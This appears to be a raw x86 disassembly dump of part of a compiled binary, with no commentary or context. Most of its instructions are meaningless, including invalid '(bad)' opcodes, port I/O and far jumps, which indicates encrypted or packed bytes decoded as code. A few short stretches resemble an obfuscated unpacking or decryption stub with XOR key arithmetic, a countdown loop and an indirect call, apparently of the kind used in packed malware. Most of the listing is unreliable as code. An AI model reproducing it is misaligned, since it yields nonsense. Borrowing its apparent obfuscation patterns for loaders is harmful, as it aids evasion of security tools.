  415ea4:	(bad)  
  415ea6:	adc    ecx,edx
  415ea8:	adc    ebx,DWORD PTR [esi-0x7a]
  415eab:	test   ecx,ebx
  415ead:	sub    al,0x16
  415eaf:	xor    al,0x61
  415eb1:	adc    ecx,edx
  415eb3:	cmc    
  415eb4:	push   eax
  415eb5:	outs   dx,BYTE PTR ds:[esi]
  415eb6:	jae    0x415ee0
  415eb8:	div    BYTE PTR [eax+ebp*4]
  415ebb:	int    0x77
  415ebd:	pop    ecx
  415ebe:	push   0x6f
  415ec0:	adc    edx,DWORD PTR [ecx]
  415ec2:	bound  edx,QWORD PTR [esi]
  415ec4:	inc    edx
  415ec5:	out    dx,al
  415ec6:	adc    DWORD PTR [esp+ecx*1+0x1e59aa3],edx
  415ecd:	mov    bh,0xed
  415ecf:	mov    bh,0x7c
  415ed1:	pop    ds
  415ed2:	cmc    
  415ed3:	jmp    0xaa2d:0x971f58b9
  415eda:	push   esp
  415edb:	mov    BYTE PTR [esi],bh
  415edd:	ret    
  415ede:	inc    esi
  415edf:	dec    ecx
  415ee0:	stc    
  415ee1:	in     eax,dx
  415ee2:	cmp    dh,BYTE PTR [eax-0x46]
  415ee5:	or     DWORD PTR [ecx+0x5c7f845],0x7d
  415eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eed:	inc    edx
  415eee:	add    BYTE PTR [eax],dh
  415ef0:	ins    DWORD PTR es:[edi],dx
  415ef1:	add    BYTE PTR [eax],al
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	scas   al,BYTE PTR es:[edi]
  415f4b:	jmp    0x415f7f
  415f4d:	sub    esp,DWORD PTR [edi]
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415f30
  415f57:	loopne 0x415f6d
  415f59:	jle    0x415edf
  415f5b:	xchg   DWORD PTR [esi+0x47283727],edx
  415f61:	mov    ds:0x65daf5b8,eax
  415f66:	jb     0x415fd5
  415f68:	jg     0x415fb8
  415f6a:	pop    eax
  415f6b:	(bad)  
  415f6c:	cmp    BYTE PTR [ebx-0x5a514510],ah
  415f72:	ins    BYTE PTR es:[edi],dx
  415f73:	push   esp
  415f74:	fst    DWORD PTR [ecx-0x2a8a07ec]
  415f7a:	sbb    eax,0x5d0e9fc9
  415f7f:	push   ebp
  415f80:	cmp    cl,BYTE PTR [ebx]
  415f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f83:	out    0xe3,eax
  415f85:	mul    dl
  415f87:	jecxz  0x415f52
  415f89:	adc    al,0xf7
  415f8b:	enter  0xe155,0xad
  415f8f:	fs (bad) 
  415f91:	out    dx,eax
  415f92:	mov    esp,0x5a82e25d
  415f97:	jae    0x277b9934
  415f9d:	or     eax,0x86979895
  415fa2:	pop    es
  415fa3:	mov    bl,0xa
  415fa5:	pop    esp
  415fa6:	dec    edx
  415fa7:	xor    BYTE PTR [ecx+0xb1fa189],0xb6
  415fae:	retf   
  415faf:	clc    
  415fb0:	jecxz  0x415fda
  415fb2:	fdivr  QWORD PTR [edi+eiz*1]
  415fb5:	pop    es
  415fb6:	inc    esp
  415fb7:	test   BYTE PTR [edx-0x3c],dl
  415fba:	mov    esi,0xe6358e2f
  415fbf:	cmc    
  415fc0:	cmp    al,BYTE PTR [eax+0x382bd9c3]
  415fc6:	outs   dx,BYTE PTR ds:[esi]
  415fc7:	lahf   
  415fc8:	mov    DWORD PTR [esi+0x6b],ebx
  415fcb:	adc    bl,dh
  415fcd:	dec    edi
  415fce:	dec    esp
  415fcf:	adc    BYTE PTR [edi],ah
  415fd1:	mov    ?,WORD PTR [ecx*4-0xf7f7ca0]
  415fd8:	xchg   bp,ax
  415fda:	xchg   edi,eax
  415fdb:	loop   0x415fa7
  415fdd:	out    0x21,eax
  415fdf:	or     BYTE PTR [ecx+0x31],al
  415fe2:	aam    0x34
  415fe4:	fdivr  QWORD PTR [esi+0x67]
  415fe7:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  415fe9:	and    edi,DWORD PTR [ecx+ecx*8-0x1f4976be]
  415ff0:	push   esi
  415ff1:	and    DWORD PTR [edi],0x4952f24c
  415ff7:	loope  0x415f87
  415ff9:	inc    edi
  415ffa:	ret    0x2ac4
  415ffd:	in     al,0x32
  415fff:	xchg   edi,eax
  416000:	inc    ebp
  416001:	mov    edi,0xf7120c7c
  416006:	shl    BYTE PTR [edx+esi*4-0x6a],cl
  41600a:	adc    esi,0xbce21fc4
  416010:	mov    ah,0x55
  416012:	jb     0x415fd4
  416014:	pop    edx
  416015:	lahf   
  416016:	push   ss
  416017:	adc    cl,BYTE PTR [esi-0x3b95c4b]
  41601d:	(bad)  
  41601e:	cld    
  41601f:	data16 cmp bh,dl
  416022:	mov    cl,0xc0
  416024:	rol    edi,cl
  416026:	pushf  
  416027:	mov    ebx,0x5aa87db4
  41602c:	fwait
  41602d:	dec    DWORD PTR [edx]
  41602f:	and    eax,0x984042f4
  416034:	mov    eax,ds:0xed77a9be
  416039:	aaa    
  41603a:	mov    ds:0x39ebd76c,eax
  41603f:	stc    
  416040:	stos   BYTE PTR es:[edi],al
  416041:	dec    ecx
  416042:	sar    BYTE PTR [edi],1
  416044:	std    
  416045:	mov    eax,ds:0xfa7b9dd1
  41604a:	push   0x26
  41604c:	xchg   ebp,eax
  41604d:	(bad)  [ecx-0x2ed63f6]
  416053:	adc    al,0x9e
  416055:	cwde   
  416056:	adc    al,0x52
  416058:	stos   DWORD PTR es:[edi],eax
  416059:	jmp    0x4160c3
  41605b:	enter  0xe517,0x1f
  41605f:	xchg   ebp,eax
  416060:	xor    ah,BYTE PTR [edi]
  416062:	pushf  
  416063:	lea    esp,[esi-0x6f632141]
  416069:	xchg   edx,eax
  41606a:	xor    bl,BYTE PTR [edi-0x21]
  41606d:	and    esi,DWORD PTR [ecx]
  41606f:	inc    ebx
  416070:	lock pop esp
  416072:	or     eax,0x4a01359a
  416077:	aaa    
  416078:	push   ebp
  416079:	mov    ebx,0x57ce9b0d
  41607e:	jo     0x416047
  416080:	ret    
  416081:	jno    0x4160ee
  416083:	lods   al,BYTE PTR ds:[esi]
  416084:	push   ebp
  416085:	test   al,0xa5
  416087:	push   eax
  416088:	(bad)  
  416089:	pop    edx
  41608a:	xor    DWORD PTR [ecx+ecx*1],ecx
  41608d:	or     eax,0x22d4583a
  416092:	int    0xa7
  416094:	shl    BYTE PTR [edx],cl
  416096:	jae    0x41602b
  416098:	aad    0x38
  41609a:	mov    WORD PTR [eax-0x12033eda],ds
  4160a0:	popa   
  4160a1:	adc    BYTE PTR [edx-0x5a38bca6],0x10
  4160a8:	pop    edx
  4160a9:	mov    edi,0x2ef882ef
  4160ae:	ror    BYTE PTR [ecx+0x3a],cl
  4160b1:	je     0x416084
  4160b3:	mov    cs,WORD PTR [edi]
  4160b5:	dec    esp
  4160b6:	jmp    0x49f6c9a5
  4160bb:	jns    0x4160ef
  4160bd:	pop    edx
  4160be:	in     eax,dx
  4160bf:	xchg   edx,eax
  4160c0:	or     BYTE PTR [edx],0xcd
  4160c3:	pop    ecx
  4160c4:	jne    0x41611b
  4160c6:	call   0x9946:0xf9f208cc
  4160cd:	add    ebp,DWORD PTR [esp+edi*8-0x46c6be91]
  4160d4:	lea    ebp,[ebx]
  4160d6:	pop    ds
  4160d7:	mov    WORD PTR [ecx+0x74009ec9],es
  4160dd:	add    al,0xa6
  4160df:	mov    ebp,0x2a35e271
  4160e4:	scas   al,BYTE PTR es:[edi]
  4160e5:	adc    BYTE PTR [edx+0x121c488b],0xb7
  4160ec:	cmp    eax,0xd3c85c6b
  4160f1:	lods   al,BYTE PTR ds:[esi]
  4160f2:	(bad)  
  4160f3:	cwde   
  4160f4:	ins    DWORD PTR es:[edi],dx
  4160f5:	mov    eax,ds:0x45809208
  4160fa:	xor    eax,esp
  4160fc:	ss cdq 
  4160fe:	dec    ecx
  4160ff:	cmp    eax,edx
  416101:	mov    DWORD PTR [eax-0x1f],edi
  416104:	xchg   edx,eax
  416105:	inc    edi
  416106:	adc    BYTE PTR [eax],0xc
  416109:	mov    eax,DWORD PTR [ebp-0x4f20271a]
  41610f:	mov    dl,0xc1
  416111:	outs   dx,DWORD PTR ds:[esi]
  416112:	out    dx,al
  416113:	dec    eax
  416114:	dec    eax
  416115:	pusha  
  416116:	cmp    BYTE PTR [esi-0x6d],dh
  416119:	fsubr  st(1),st
  41611b:	dec    eax
  41611c:	lods   al,BYTE PTR ds:[esi]
  41611d:	mov    cs,ebx
  41611f:	in     eax,dx
  416120:	inc    ecx
  416121:	gs mov dl,0x78
  416124:	dec    edx
  416125:	jb     0x416162
  416127:	aas    
  416128:	test   bh,dl
  41612a:	mov    DWORD PTR [ebx-0x63e7ad5d],ebp
  416130:	sub    dl,BYTE PTR [edx]
  416132:	jae    0x41615a
  416134:	into   
  416135:	xor    eax,0xfcd41c95
  41613a:	ret    0xdc98
  41613d:	inc    edx
  41613e:	pop    esi
  41613f:	push   edx
  416140:	jg     0x4160c2
  416142:	or     eax,0x4950750b
  416147:	in     al,0x4f
  416149:	int    0x78
  41614b:	scas   al,BYTE PTR es:[edi]
  41614c:	xchg   DWORD PTR [ebp-0x6a39527c],esi
  416152:	aaa    
  416153:	mov    ah,0x7
  416155:	bound  ebp,QWORD PTR [esi]
  416157:	ror    BYTE PTR [eax],1
  416159:	scas   eax,DWORD PTR es:[edi]
  41615a:	cmp    cl,bh
  41615c:	(bad)  
  41615d:	daa    
  41615e:	mov    dl,0x75
  416160:	push   es
  416161:	xchg   esi,eax
  416162:	mov    cl,0x89
  416164:	daa    
  416165:	inc    ecx
  416166:	ret    
  416167:	mov    dl,0xfa
  416169:	sar    DWORD PTR [eax],0xa3
  41616c:	jle    0x4161cd
  41616e:	pop    esi
  41616f:	test   BYTE PTR [eax],cl
  416171:	das    
  416172:	je     0x41617f
  416174:	fwait
  416175:	mov    ecx,0xd84198e6
  41617a:	cmp    BYTE PTR [eax-0xf97c733],ah
  416180:	ja     0x416201
  416182:	sbb    ebx,DWORD PTR [ebx+ebp*4]
  416185:	inc    DWORD PTR [esp+ebx*1]
  416188:	adc    esp,esi
  41618a:	dec    ebx
  41618b:	fwait
  41618c:	arpl   WORD PTR [ebp+0x1e],bx
  41618f:	sub    eax,0xf8e39a95
  416194:	jmp    0x4161b2
  416196:	or     esi,DWORD PTR [edx]
  416198:	xchg   ecx,eax
  416199:	cmc    
  41619a:	cs mov esi,0xf811aac
  4161a0:	into   
  4161a1:	rcr    DWORD PTR [ecx-0x7a4a0c3c],1
  4161a7:	mov    ebp,0xd215261f
  4161ac:	retf   
  4161ad:	mov    edx,0x6e6353de
  4161b2:	inc    eax
  4161b3:	add    esi,edx
  4161b5:	jo     0x41619f
  4161b7:	fwait
  4161b8:	inc    ebx
  4161b9:	lahf   
  4161ba:	scas   al,BYTE PTR es:[edi]
  4161bb:	bound  esp,QWORD PTR [ecx+edi*8-0xd]
  4161bf:	retf   0xb816
  4161c2:	inc    eax
  4161c3:	ror    DWORD PTR [edx*2+0x664f5dc2],0x3
  4161cb:	add    esi,esi
  4161cd:	cli    
  4161ce:	add    al,BYTE PTR [ebx+edx*2+0x3b]
  4161d2:	pop    ds
  4161d3:	sbb    eax,0x40e8f851
  4161d8:	mov    ecx,0xf9a66642
  4161dd:	pop    ebx
  4161de:	dec    ebx
  4161df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161e0:	mov    ecx,0x96d78e86
  4161e5:	call   0x571ce453
  4161ea:	ret    0x29e7
  4161ed:	and    eax,0x8b2d541f
  4161f2:	inc    ebp
  4161f3:	cld    
  4161f4:	mov    DWORD PTR ds:0x42a88d,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x73cb2b46]
  416290:	adc    bh,BYTE PTR [eax+ebx*1+0x7e95787f]
  416297:	js     0x416311
  416299:	enter  0x5c12,0x68
  41629d:	je     0x416230
  41629f:	pushf  
  4162a0:	pop    edx
  4162a1:	jns    0x4162a3
  4162a3:	mov    cl,0x5f
  4162a5:	js     0x416252
  4162a7:	dec    ecx
  4162a8:	addr16 cdq 
  4162aa:	ins    BYTE PTR es:[edi],dx
  4162ab:	jnp    0x416231
  4162ad:	push   cs
  4162ae:	cwde   
  4162af:	inc    edi
  4162b0:	or     al,0x55
  4162b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162b3:	int    0xa8
  4162b5:	jns    0x416272
  4162b7:	jno    0x416254
  4162b9:	lock int 0xdf
  4162bc:	adc    eax,0x2bdef11d
  4162c1:	mov    ds:0x58c1da6f,al
  4162c6:	cmp    al,0xd3
  4162c8:	lock mov ds:0xc89c1fb,al
  4162ce:	ss and esi,ebx
  4162d1:	add    BYTE PTR [ebp-0x5432b56d],dl
  4162d7:	adc    DWORD PTR [esi-0x4db39c6b],edx
  4162dd:	jecxz  0x41627f
  4162df:	cmp    dh,BYTE PTR [esp+edx*2]
  4162e2:	cmc    
  4162e3:	rcr    BYTE PTR [edi+0x38e1b9a1],cl
  4162e9:	nop
  4162ea:	fisttp DWORD PTR [eax-0x41fbf051]
  4162f0:	sbb    ebx,0x38
  4162f3:	jb     0x416373
  4162f5:	hlt    
  4162f6:	shl    edx,0xbd
  4162f9:	loop   0x41635c
  4162fb:	nop
  4162fc:	icebp  
  4162fd:	mov    ds:0x310255f3,eax
  416302:	jmp    0x4162b1
  416304:	ret    
  416305:	sbb    eax,edi
  416307:	jle    0x4162e0
  416309:	dec    edi
  41630a:	out    0xe8,al
  41630c:	pop    ss
  41630d:	icebp  
  41630e:	mov    ch,0x74
  416310:	mov    al,0xb0
  416312:	sub    edx,DWORD PTR [eax]
  416314:	lahf   
  416315:	xor    ebx,edx
  416317:	push   esp
  416318:	dec    ebp
  416319:	stc    
  41631a:	enter  0x1444,0x33
  41631e:	(bad)  
  416320:	imul   eax,DWORD PTR [esi-0x4],0xd
  416324:	dec    ebp
  416325:	lods   al,BYTE PTR ds:[esi]
  416326:	jecxz  0x416347
  416328:	add    BYTE PTR [ecx],bl
  41632a:	jo     0x4162ca
  41632c:	xor    esp,DWORD PTR [ebx+0x5e072b73]
  416332:	popa   
  416333:	and    ah,dl
  416335:	mov    bl,0x31
  416337:	jmp    0x4163ad
  416339:	adc    eax,0x2b897e8f
  41633f:	xor    BYTE PTR [esi],ch
  416341:	push   eax
  416342:	lds    ebx,FWORD PTR [ecx-0x58]
  416345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416346:	and    ebp,DWORD PTR [edx-0x67]
  416349:	cmp    DWORD PTR [ebx],0xffffffd2
  41634c:	fs repz push es
  41634f:	xchg   BYTE PTR [edx+ebx*8-0x6bfa2c09],al
  416356:	mov    ebx,0x49ac0012
  41635b:	popa   
  41635c:	je     0x41630d
  41635e:	xor    DWORD PTR [ebx],eax
  416360:	test   BYTE PTR [ebp-0x61b88a13],ah
  416366:	or     esp,DWORD PTR [edi+edx*4+0x25ec15e9]
  41636d:	out    dx,al
  41636e:	loope  0x41632e
  416370:	pop    esi
  416371:	adc    al,0x71
  416373:	fidivr DWORD PTR ds:0xba7784c1
  416379:	(bad)  
  41637a:	scas   eax,DWORD PTR es:[edi]
  41637b:	xor    al,0xa8
  41637d:	xchg   DWORD PTR [ebx+0x56],ebp
  416380:	xchg   DWORD PTR [edi],ebp
  416382:	mov    edx,0xc7b4aaa8
  416387:	aam    0xdb
  416389:	rcl    bh,1
  41638b:	gs pop edx
  41638d:	push   es
  41638e:	add    al,BYTE PTR [ecx+0x32]
  416391:	push   edi
  416392:	sbb    dh,BYTE PTR [ecx+0x6b358061]
  416398:	int3   
  416399:	push   esp
  41639a:	ss dec ecx
  41639c:	cs fdecstp 
  41639f:	mov    dl,0xab
  4163a1:	mov    dh,0x70
  4163a3:	cli    
  4163a4:	clc    
  4163a5:	jns    0x4163f3
  4163a7:	jg     0x83766468
  4163ad:	jmp    0xed2e:0xec2980d
  4163b4:	movzx  esi,BYTE PTR [ebp-0x7c]
  4163b8:	frstor [ebp-0x6f]
  4163bb:	mov    ds:0x5eead94a,eax
  4163c0:	pop    eax
  4163c1:	xor    ah,BYTE PTR [ecx+0xe16fd40]
  4163c7:	xchg   DWORD PTR [ecx],ebp
  4163c9:	push   ecx
  4163ca:	inc    ebp
  4163cb:	rcl    BYTE PTR ds:0x6b855098,1
  4163d1:	push   eax
  4163d2:	push   esp
  4163d3:	sub    ebx,edx
  4163d5:	sub    DWORD PTR [edx],ecx
  4163d7:	jae    0x41638b
  4163d9:	push   ebx
  4163da:	and    DWORD PTR [edx+eax*2-0x27],0x3c
  4163df:	pop    eax
  4163e0:	xchg   edx,eax
  4163e1:	imul   eax,DWORD PTR [esi+0x70],0xffffffb6
  4163e5:	pop    edi
  4163e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163e7:	mov    cl,0xa6
  4163e9:	and    ebx,ebx
  4163eb:	mov    ch,0x11
  4163ed:	test   BYTE PTR [edx+0x70159c77],dl
  4163f3:	jmp    0x41637d
  4163f5:	test   BYTE PTR [eax],dh
  4163f7:	mov    edi,0xbb5e7b5d
  4163fc:	sub    ah,al
  4163fe:	outs   dx,BYTE PTR ds:[esi]
  4163ff:	fs xchg edi,eax
  416401:	aas    
  416402:	sbb    DWORD PTR [edi],edi
  416404:	shr    DWORD PTR [edi+0x1c],cl
  416407:	inc    eax
  416408:	repnz sub al,0x3d
  41640b:	adc    al,0x63
  41640d:	mov    dl,0x44
  41640f:	push   edi
  416410:	mov    BYTE PTR ds:0x14490846,ah
  416416:	xchg   edi,eax
  416417:	scas   al,BYTE PTR es:[edi]
  416418:	jb     0x416437
  41641a:	mov    al,ds:0x7584f35b
  41641f:	aad    0x64
  416421:	(bad)  [edi+ecx*8+0x118eb8fa]
  416428:	mov    ds:0xf659ffa2,al
  41642d:	push   edx
  41642e:	sub    bl,0x9a
  416431:	lahf   
  416432:	popf   
  416433:	add    al,0x90
  416435:	retf   0x4777
  416438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416439:	xor    eax,0xa8773aba
  41643f:	mov    ch,BYTE PTR [edx]
  416441:	test   BYTE PTR [edx+0x14],cl
  416444:	stos   DWORD PTR es:[edi],eax
  416445:	sahf   
  416446:	jo     0x41644a
  416448:	sub    al,0x20
  41644a:	enter  0xd737,0x4c
  41644e:	test   eax,0xc517755f
  416453:	cmp    al,0x1e
  416455:	in     al,dx
  416456:	bound  edi,QWORD PTR [ebx+0x1f705387]
  41645c:	xchg   BYTE PTR [edi],cl
  41645e:	fldenv [esi+eax*4-0x48b83f9b]
  416465:	xlat   BYTE PTR ds:[ebx]
  416466:	jmp    0x5f9e:0x62c21e2d
  41646d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41646e:	lea    esi,[eax]
  416470:	out    0xff,eax
  416472:	mov    bh,0x64
  416474:	fstp   DWORD PTR [edx+0x3922be08]
  41647a:	retf   0xfa75
  41647d:	or     dl,BYTE PTR [ebp-0x4a]
  416480:	push   ecx
  416481:	push   ebx
  416482:	stos   DWORD PTR es:[edi],eax
  416483:	cmp    dl,BYTE PTR [ebx]
  416485:	lds    ecx,FWORD PTR [edx+0x6]
  416488:	jp     0x416457
  41648a:	mov    ds,ebp
  41648c:	bound  ebp,QWORD PTR [eax+esi*2+0x35]
  416490:	es jns 0x41643f
  416493:	mov    bh,0x80
  416495:	xchg   edi,eax
  416496:	push   esp
  416497:	or     al,0x35
  416499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41649a:	stos   DWORD PTR es:[edi],eax
  41649b:	dec    esp
  41649c:	dec    edx
  41649d:	pop    ebx
  41649e:	or     bl,BYTE PTR [esi+0x5e]
  4164a1:	sub    cl,BYTE PTR [ecx-0x60bd1216]
  4164a7:	add    ah,BYTE PTR [ebx-0x50]
  4164aa:	sbb    esi,edx
  4164ac:	fild   QWORD PTR [ecx+ebp*4-0xf]
  4164b0:	imul   ebx,DWORD PTR [eax+0x4d],0x51
  4164b4:	jns    0x4164b2
  4164b6:	inc    esi
  4164b7:	xchg   ecx,eax
  4164b8:	and    DWORD PTR [esi+ebx*2-0x4b],esi
  4164bc:	mov    al,ds:0x524d029d
  4164c1:	(bad)  
  4164c2:	xchg   esi,eax
  4164c3:	inc    edi
  4164c4:	mov    bh,0x40
  4164c6:	jns    0x416504
  4164c8:	cwde   
  4164c9:	and    BYTE PTR [ebp+eax*4-0x3],al
  4164cd:	mov    eax,ds:0x692f11e
  4164d2:	out    0x5e,al
  4164d4:	mov    eax,0xcf5dc08b
  4164d9:	std    
  4164da:	inc    edi
  4164db:	lock icebp 
  4164dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164de:	jl     0x416502
  4164e0:	ins    BYTE PTR es:[edi],dx
  4164e1:	std    
  4164e2:	jl     0x4164bf
  4164e4:	rcl    DWORD PTR [ebp+0x1387b8a1],cl
  4164ea:	in     eax,dx
  4164eb:	jp     0x41653e
  4164ed:	xchg   esp,eax
  4164ee:	sub    dx,0x9cdd
  4164f3:	in     al,dx
  4164f4:	cmp    ebx,DWORD PTR [ebx]
  4164f6:	dec    eax
  4164f7:	inc    ebp
  4164f8:	sub    al,0xa7
  4164fa:	lods   al,BYTE PTR ds:[esi]
  4164fb:	fild   QWORD PTR [eax-0x5939bf01]
  416501:	ss inc eax
  416503:	loope  0x41657b
  416505:	leave  
  416506:	dec    ebp
  416507:	(bad)  
  416508:	pop    edi
  416509:	(bad)  
  41650a:	outs   dx,DWORD PTR ds:[esi]
  41650b:	cld    
  41650c:	and    eax,0x9f33d926
  416511:	dec    esi
  416512:	iret   
  416513:	fst    QWORD PTR [eax+0x78]
  416516:	rcl    BYTE PTR [edi+0x48],cl
  416519:	jmp    0xf553ea1f
  41651e:	pop    es
  41651f:	pop    edx
  416520:	je     0x41655e
  416522:	jp     0x41650f
  416524:	shl    DWORD PTR [ebx],1
  416526:	ins    DWORD PTR es:[edi],dx
  416527:	mov    dh,0x21
  416529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41652a:	shr    DWORD PTR [eiz*4+0x3e1bf9fc],cl
  416531:	rcr    BYTE PTR [ebp+0x1832e83d],1
  416537:	add    BYTE PTR [eax],al
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp+0x50e37c66],cl
  416557:	push   esp
  416558:	jp     0x4164ed
  41655a:	fstp   DWORD PTR ds:0x7e95787f
  416560:	js     0x4165da
  416562:	push   ebp
  416563:	push   0x22
  416565:	cmp    al,0xff
  416567:	ret    0x42a8
  41656a:	lds    ebp,FWORD PTR [ebp-0x695bbe91]
  416570:	pusha  
  416571:	and    cl,BYTE PTR [esp+esi*1+0x3f]
  416575:	and    DWORD PTR [ecx-0x5ce84174],ebx
  41657b:	int    0x5a
  41657d:	cld    
  41657e:	mov    ah,0xf2
  416580:	push   ebx
  416581:	jb     0x4165c6
  416583:	jo     0x41651c
  416585:	popf   
  416586:	or     ecx,DWORD PTR [edi-0x64]
  416589:	add    al,0x44
  41658b:	push   0xd2c3a3c9
  416590:	mov    al,ds:0x7720983d
  416595:	dec    edi
  416596:	sbb    DWORD PTR [esi+0x71],edi
  416599:	shl    BYTE PTR [ebp+0x43b08ae0],1
  41659f:	test   al,0x24
  4165a1:	loop   0x41656d
  4165a3:	xchg   esi,eax
  4165a4:	stc    
  4165a5:	(bad)  
  4165a6:	pop    eax
  4165a7:	scas   al,BYTE PTR es:[edi]
  4165a8:	and    eax,0x212d4ad9
  4165ad:	fild   QWORD PTR [esi-0x72d4bc77]
  4165b3:	xchg   ebx,eax
  4165b4:	and    al,0x17
  4165b6:	jno    0x416541
  4165b8:	mov    bh,0xca
  4165ba:	xchg   esi,eax
  4165bb:	sbb    DWORD PTR [edx],eax
  4165bd:	or     bh,ch
  4165bf:	repnz mov ebx,DWORD PTR [ecx-0x30]
  4165c3:	popf   
  4165c4:	out    0xfe,eax
  4165c6:	jmp    0x416562
  4165c8:	and    esp,edx
  4165ca:	pop    es
  4165cb:	data16 mov al,ds:0xe6a30103
  4165d1:	sbb    bh,BYTE PTR gs:[edi+0x61]
  4165d5:	(bad)  
  4165d6:	push   ebx
  4165d7:	jge    0x4165d1
  4165d9:	mov    ah,bl
  4165db:	xchg   BYTE PTR [eax+0xbbd9f91],ch
  4165e1:	mov    al,0xed
  4165e3:	or     al,0x37
  4165e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165e6:	into   
  4165e7:	(bad)  
  4165e8:	xor    dl,ch
  4165ea:	inc    eax
  4165eb:	pop    edx
  4165ec:	mov    dl,0xb0
  4165ee:	and    cl,BYTE PTR [edi-0x712cb7d9]
  4165f4:	daa    
  4165f5:	lock ret 
  4165f7:	mov    edi,0xcc818611
  4165fc:	fdiv   DWORD PTR [esp+edi*2-0x6972d2da]
  416603:	test   dl,cl
  416605:	cmp    ebp,DWORD PTR [edx+0x106c55c]
  41660b:	ret    0xe027
  41660e:	imul   esi,ecx,0xfffffffd
  416611:	ret    0x2bff
  416614:	jno    0x41663b
  416616:	adc    ecx,ebx
  416618:	push   ecx
  416619:	and    al,BYTE PTR [eax]
  41661b:	push   ebp
  41661c:	pop    eax
  41661d:	inc    esi
  41661e:	inc    ecx
  41661f:	out    dx,al
  416620:	mov    ebx,0x909fb501
  416625:	xchg   edx,eax
  416626:	xchg   ecx,eax
  416627:	push   DWORD PTR [ecx]
  416629:	arpl   WORD PTR [ebx-0x6bb33d4b],si
  41662f:	ja     0x416634
  416631:	pop    ss
  416632:	xchg   ebp,eax
  416633:	(bad)  
  416634:	inc    bl
  416636:	sbb    DWORD PTR [ebp-0x3e3b59bf],esi
  41663c:	adc    edx,DWORD PTR [edi-0x6d2dcd39]
  416642:	jg     0x416656
  416644:	xor    eax,0xff6037c5
  416649:	push   0xffffffd8
  41664b:	stos   DWORD PTR es:[edi],eax
  41664c:	xchg   esi,eax
  41664d:	dec    edi
  41664e:	mov    ch,0x17
  416650:	imul   esi,DWORD PTR [edi-0x61],0xffffffe3
  416654:	ret    0xe657
  416657:	(bad)  
  416658:	xchg   esp,eax
  416659:	in     eax,dx
  41665a:	adc    DWORD PTR es:[ebp+0x64d488c5],0xffffff91
  416662:	clc    
  416663:	mov    bl,0x75
  416665:	sbb    DWORD PTR [ebp-0x3c8150bc],edx
  41666b:	fdivr  QWORD PTR [ebx-0x6dc3780]
  416671:	mov    al,ds:0x63e50bd4
  416676:	sbb    edi,DWORD PTR [edi]
  416678:	push   esi
  416679:	(bad)  
  41667a:	ins    DWORD PTR es:[edi],dx
  41667b:	mov    eax,0x100400fa
  416680:	adc    edi,DWORD PTR ds:0x87789746
  416686:	xchg   edi,eax
  416687:	into   
  416688:	fild   QWORD PTR ds:0xa24e5de8
  41668e:	cli    
  41668f:	iret   
  416690:	adc    al,0x9c
  416692:	xchg   BYTE PTR ds:0x5ba1f6cf,ah
  416698:	sbb    BYTE PTR [ebx],bl
  41669a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41669c:	test   DWORD PTR [edi],esi
  41669e:	jne    0x41662f
  4166a0:	adc    eax,0x8d25f828
  4166a5:	mov    ch,0x15
  4166a7:	mov    ebx,esi
